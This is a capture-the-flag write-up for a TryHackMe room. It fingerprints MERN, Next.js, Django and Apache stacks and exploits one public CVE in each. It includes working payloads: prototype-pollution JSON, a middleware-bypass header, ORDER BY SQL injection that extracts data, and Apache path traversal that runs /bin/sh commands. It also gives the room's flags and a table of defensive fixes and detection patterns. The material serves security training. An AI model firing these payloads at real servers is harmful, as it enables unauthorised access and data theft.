# TryHackMe: Modern Web Stacks — Writeup

**Platform:** TryHackMe (Premium)
**Room focus:** Fingerprint four modern web stacks (MERN, Next.js, Django, LAMP), then exploit a CVE in each.
**Method throughout:** *read the signals → confirm the version → execute the chain.* No payload is fired blind; every exploit is earned by a fingerprint first.

---

## Target Layout

The four stacks each run on their own port behind the same host. Port 80 is closed, which is itself the first useful signal.

| Stack | Port | CVE | Impact | CVSS |
|---|---|---|---|---|
| MERN / Express | 3000 | CVE-2020-8203 | Prototype pollution → auth bypass | 7.4 High |
| Next.js (App Router) | 3001 | CVE-2025-29927 | Single header → full middleware bypass | 9.1 Critical |
| Django ORM | 8000 | CVE-2021-35042 | SQLi via unparameterised `ORDER BY` | 9.8 Critical |
| Apache LAMP | 8080 | CVE-2021-41773 | Path traversal + mod_cgi → RCE | 9.8 Critical |

### Reachability check first

Before anything else, confirm the box is actually up — a `Connection refused` is very different from a timeout.

```bash
nc -zv -w 5 <target> 80
# (UNKNOWN) [<target>] 80 (http) : Connection refused
```

**`Connection refused` = host is up, nothing listening on that port.** Compare with `timed out` / `No route to host`, which mean the box is down or not deployed. Refused told us the host was alive and the services were simply on other ports — consistent with "four stacks on four ports." A quick `nmap -sV -p-` (or targeting 3000/3001/8000/8080 directly) maps them out.

> **Tip:** THM target IPs roll on redeploy. Pin it once so a rolling IP doesn't derail a session:
> ```bash
> export IP=<target>
> ```

---

## Stack 1 — MERN / Express (port 3000)

### Fingerprint

```bash
curl -I http://$IP:3000/
```

Signals to read:

| Signal | Value | Confidence |
|---|---|---|
| `X-Powered-By` header | `Express` | High |
| `Set-Cookie` | `connect.sid=s%3A...` | High |
| Unhandled route | `Cannot GET /nonexistent` (plain text) | High |
| Root element | `<div id="root">` in HTML body | Medium |

`X-Powered-By: Express` is the primary tell — Express sends it by default unless the dev explicitly disabled it or added Helmet. The `connect.sid` cookie comes from `express-session`. The plain-text `Cannot GET /...` unhandled-route response is unambiguous (Django, Apache, and Next.js all return styled HTML instead).

```bash
curl http://$IP:3000/
# <html><body><div id="root"><h1>MERN Lab App</h1></div></body></html>
```

React root element + Express header = MERN confirmed.

### CVE-2020-8203 — Prototype Pollution → Auth Bypass

The app exposes two relevant endpoints:

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/user/update` | POST | Merges arbitrary JSON into the session user object |
| `/api/admin/flag` | GET | Returns the flag if `currentUser.isAdmin` is truthy |

The vulnerable merge recurses into nested objects without filtering dangerous keys:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);      // recurses into __proto__ / constructor
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

When the source key is `__proto__` (or `constructor.prototype`), `target[key]` is a reference to `Object.prototype`, not a normal property. Writing `isAdmin: true` there sets it on the shared root, so **every** object in the Node process resolves `.isAdmin` to `true` via the prototype chain — including the session object the admin route checks.

**Step 1 — grab a session cookie and confirm the gate:**

```bash
curl -c cookies.txt http://$IP:3000/
curl -b cookies.txt http://$IP:3000/api/admin/flag
# {"error":"Not authorized"}
```

**Step 2 — pollute the prototype.** Direct `__proto__` works on unhardened apps; the `constructor.prototype` path reaches `Object.prototype` by a different route and bypasses input filters that block `__proto__`:

```bash
curl -b cookies.txt -X POST http://$IP:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'
# {"status":"updated"}
```

**Step 3 — request the flag.** `currentUser.isAdmin` now resolves `true` up the chain:

```bash
curl -b cookies.txt http://$IP:3000/api/admin/flag
# {"flag":"THM{pr0t0_p0llut3d}"}
```

> **Payload note:** If `__proto__` is filtered at the input layer, `{"constructor":{"prototype":{"isAdmin":true}}}` walks to the same `Object.prototype` and is the more robust choice.

**Flag:** `THM{pr0t0_p0llut3d}`

---

## Stack 2 — Next.js App Router (port 3001)

### Fingerprint

```bash
curl -I http://$IP:3001/
```

| Signal | Value | Confidence |
|---|---|---|
| `X-Powered-By` | `Next.js` | High |
| HTML source | `window.__next_f` in a `<script>` | High (confirms App Router) |
| Static assets | `/_next/static/chunks/` | High |
| `x-nextjs-*` headers | `x-nextjs-cache`, `x-nextjs-prerender`, `x-nextjs-stale-time` | High (production build) |
| Protected route | `307` redirect to `/login` | Medium |

`window.__next_f` is the definitive App Router indicator — it's the React Server Component hydration array injected into every App Router page and appears in no other framework or in the Pages Router. The `x-nextjs-*` headers confirm production build mode, the precondition for CVE-2025-29927 (the CVE does not manifest under `next dev`).

### CVE-2025-29927 — Middleware Auth Bypass

Next.js middleware is where most apps put authentication — it runs in front of every route. Internally, Next.js uses the `x-middleware-subrequest` header to avoid recursively re-running middleware on internal subrequests. **The flaw: Next.js never validated whether that header came from an internal process or an external client.** Supply it yourself and middleware is skipped entirely — the auth check never runs.

**Step 1 — confirm the gate is live:**

```bash
curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" http://$IP:3001/dashboard
# 307 -> http://<target>:3001/login
```

No cookie → `307` to `/login`. Middleware is doing its job.

**Step 2 — bypass it.** The header value is the middleware module path repeated five times, colon-separated:

```bash
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://$IP:3001/dashboard | grep -iE 'flag|thm\{'
```

Rendered response body:

```html
<div><h1>Dashboard</h1><p>Flag: <!-- -->THM{m1ddl3w4r3_byp4ss3d}</p></div>
```

The request routed straight to the dashboard handler — no credentials, no session token, one header. CVSS 9.1.

> **`/src` structure:** If `middleware.ts` lives under `src/`, the header value becomes `src/middleware` repeated five times. Always check whether middleware is at project root or inside `src/`.

**Flag:** `THM{m1ddl3w4r3_byp4ss3d}`

> **Sibling CVE (out of scope here):** CVE-2025-55182 is an unauthenticated RCE via insecure deserialisation in the RSC Flight protocol parser (CVSS 10.0) — a full exploit chain rather than a one-header trick, covered in its own room.

---

## Stack 3 — Django (port 8000)

### Fingerprint

```bash
curl -I http://$IP:8000/products/
```

| Signal | Value | Confidence |
|---|---|---|
| `Server` header | `WSGIServer/0.2 CPython/X.X.X` | High |
| Cookie | `csrftoken` | High |
| Security headers | `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin` together | High (SecurityMiddleware) |
| POST form | hidden `csrfmiddlewaretoken` field | High |

`csrfmiddlewaretoken` is the most reliable Django fingerprint — `CsrfViewMiddleware` injects it into every POST form automatically, and it appears in no Express/Rails/Next.js app. Viewing `/products/` shows the injection point:

```html
<form method="get" action="">
  <input type="hidden" name="csrfmiddlewaretoken" value="...">
  <input type="hidden" name="order" value="">    <!-- user-controlled sort column -->
</form>
```

### CVE-2021-35042 — SQL Injection via `ORDER BY`

The view concatenates the `order` parameter directly into an `ORDER BY` clause with no parameterisation:

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```

The `CASE WHEN (1=1)` is always true, so the `THEN {order}` branch always executes — that's the injection entry point.

**Extraction technique — `updatexml()` error-based:** `updatexml(1, xpath_expr, 1)` raises an error when `xpath_expr` is not valid XPath. Wrapping a subquery in `concat(0x7e, ...)` (`0x7e` = `~`) makes MySQL fold the query result into the error string, and Django's `DEBUG = True` obligingly renders that MySQL error in the 500 response body. Three things must line up: the SQLi entry point, MySQL's XPath error leakage, and debug mode surfacing it.

**Step 1 — confirm injection + pull the DB version:**

```bash
curl -s "http://$IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" \
  | grep -o '~[0-9][^<]*'
# ~8.0.45-0ubuntu0.22.04.1
```

The `~` prefix means the payload executed and MySQL returned data through the error. Target is MySQL 8.0 on Ubuntu 22.04. (The same 500 page also leaks `Django Version: 3.2.4` in its debug output.)

**Step 2 — extract the database name:**

```bash
curl -s "http://$IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" \
  | grep -o '~[0-9a-zA-Z_][^<]*'
# ~vuln_db
```

The trailing `&#x27;&quot;)` in raw output is just HTML-encoded quotes from the debug markup — the value between `~` and that junk is what matters.

**Database:** `vuln_db`

> **Follow-through:** with the DB name confirmed, feed it to `sqlmap` (`--dbms=mysql -D vuln_db --dump`) to automate full extraction. On a real target with `DEBUG = False`, error output is suppressed — fall back to blind time-based injection with `SLEEP()`.

---

## Stack 4 — Apache LAMP (port 8080)

### Fingerprint

```bash
curl -I http://$IP:8080/
```

| Signal | Value | Confidence |
|---|---|---|
| `Server` header | `Apache/2.4.49 (Unix)` | High — exact CVE match |
| 404 footer | Apache `2.4.49` version string | High |
| `/cgi-bin/` response | `403 Forbidden` (not 404) | High — mod_cgi enabled |

```
Server: Apache/2.4.49 (Unix)
```

That exact version maps to **CVE-2021-41773 and nothing else**. A `403` on `/cgi-bin/` (rather than `404`) confirms mod_cgi is present — required to turn file-read into RCE.

### CVE-2021-41773 — Path Traversal → mod_cgi RCE

Apache 2.4.49 changed `ap_normalize_path()` and broke the traversal filter. The bug is one of **decode order**: the traversal filter runs *before* full URL decoding. Sending `.%2e/` (a literal dot + URL-encoded dot + slash) slips past the filter — which doesn't recognise it as `../` — and then the OS resolves `.%2e/` to `../` at the filesystem. Filter bypassed.

Chained to mod_cgi, traversal to an executable like `/bin/sh` makes Apache run it as a CGI script and pipe the POST body to its stdin — unauthenticated RCE.

> **Why `--path-as-is` is mandatory:** curl normalises URLs before sending, cleaning up `.%2e/` so the server receives a plain path (→ 403). `--path-as-is` sends the URL exactly as typed. A traversal returning 403 instead of executing is almost always a missing `--path-as-is`.

**Step 1 — confirm RCE:**

```bash
curl -s --path-as-is "http://$IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

The `echo Content-Type: text/plain; echo;` preamble is required — the CGI spec needs a valid header block plus a blank separator line before output, or Apache returns 500. Web process runs as `daemon`.

**Step 2 — read the flag:**

```bash
curl -s --path-as-is "http://$IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
# THM{4p4ch3_p4th_tr4v3rs4l}
```

If `/flag.txt` isn't present, locate it with the same primitive:

```bash
curl -s --path-as-is "http://$IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; find / -name "flag*" 2>/dev/null'
```

**Flag:** `THM{4p4ch3_p4th_tr4v3rs4l}`

> **Version specificity:** 2.4.49 only for single-encoded dots. 2.4.50's partial patch is bypassed by double-encoding (CVE-2021-42013, `%%32%65%%32%65/`). 2.4.51+ is fully patched. Any `Server: Apache/2.4.49` or `2.4.50` is an immediate signal to reach for this CVE.

---

## Automation Pass — Nikto

Nikto is first-pass triage across many hosts, not an exploitation tool. One scan per port surfaces the stack signals and misconfigurations in under a minute:

```bash
nikto -h http://$IP:3000    # Express: x-powered-by, connect.sid (no httponly)
nikto -h http://$IP:3001    # Next.js: x-powered-by + x-nextjs-* (production build)
nikto -h http://$IP:8000    # Django: WSGIServer/CPython banner + SecurityMiddleware headers
nikto -h http://$IP:8080    # Apache/2.4.49 (Unix) → direct CVE-2021-41773 indicator
```

What Nikto **gives you:** exact server versions (the Apache banner is the single most valuable finding — version → CVE with zero further work), stack confirmation via headers, and bonus misconfigs (missing `httponly`, TRACE enabled/XST, inode leak via ETags).

What Nikto **does not give you:** application-level injection flaws. It has no template for the prototype pollution, the middleware bypass, or the `ORDER BY` SQLi. That is exactly where the manual techniques take over — automation narrows the field; manual work lands the exploit.

---

## Key Takeaways

- **Every stack leaks its identity.** A header, a cookie name, an error-page format, a hydration array, a version string — read them and you stop guessing and start targeting.
- **The workflow is constant:** read the signals → confirm the version → execute the chain. It held for all four stacks unchanged.
- **Version confirmation is not optional.** `--path-as-is` does nothing without knowing it's 2.4.49; the middleware header does nothing without confirming App Router in production. The fingerprint is what makes the exploit fire.
- **`Connection refused` ≠ box down.** Refused means the host is up with nothing on that port — read connection errors as signals, not just failures.
- **Reach for the robust payload variant.** `constructor.prototype` over `__proto__`, double-encoding for the 2.4.50 patch — knowing the hardened path saves a dead end.

### Defensive notes

| CVE | Fix | Detection |
|---|---|---|
| CVE-2020-8203 (prototype pollution) | Filter `__proto__` / `constructor` / `prototype` keys in merge; use `Object.create(null)` or `Map` for user data; `Object.freeze(Object.prototype)` | POST bodies containing `__proto__` / `constructor.prototype` keys |
| CVE-2025-29927 (Next.js) | Upgrade to patched Next.js; strip `x-middleware-subrequest` at the edge/proxy; don't rely on middleware as sole authz | Inbound requests carrying `x-middleware-subrequest` from external clients |
| CVE-2021-35042 (Django) | Parameterise queries / use the ORM properly; never concatenate into `ORDER BY`; `DEBUG = False` in prod | 500s with `updatexml`/`extractvalue`; `~`-delimited values in responses |
| CVE-2021-41773 (Apache) | Upgrade to 2.4.51+; `Require all denied` on filesystem root; disable unused mod_cgi | Requests with `%2e`/`.%2e/` toward `/cgi-bin/`, POST bodies to `/bin/sh` |

---

## Flags

| Stack | CVE | Flag |
|---|---|---|
| MERN / Express | CVE-2020-8203 | `THM{pr0t0_p0llut3d}` |
| Next.js | CVE-2025-29927 | `THM{m1ddl3w4r3_byp4ss3d}` |
| Django | CVE-2021-35042 | database: `vuln_db` |
| Apache LAMP | CVE-2021-41773 | `THM{4p4ch3_p4th_tr4v3rs4l}` |

**Room complete.**
